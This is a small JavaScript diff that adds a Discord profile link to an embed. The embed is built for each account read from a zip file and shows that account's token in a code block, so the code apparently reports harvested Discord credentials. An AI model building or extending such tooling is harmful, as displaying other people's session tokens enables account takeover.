@@ -67,7 +67,8 @@ const json = async (zipFile) => {
         description: `Token: ${codeBlock(account.token)}`,
         author: {
           name: usernameFormat(account.global_name, account.username, account.discriminator),
-          icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
+          icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator),
+          url: `https://discord.com/users/${account.id}`
         },
         fields: [
           ['🆔 ID', code(account.id)],
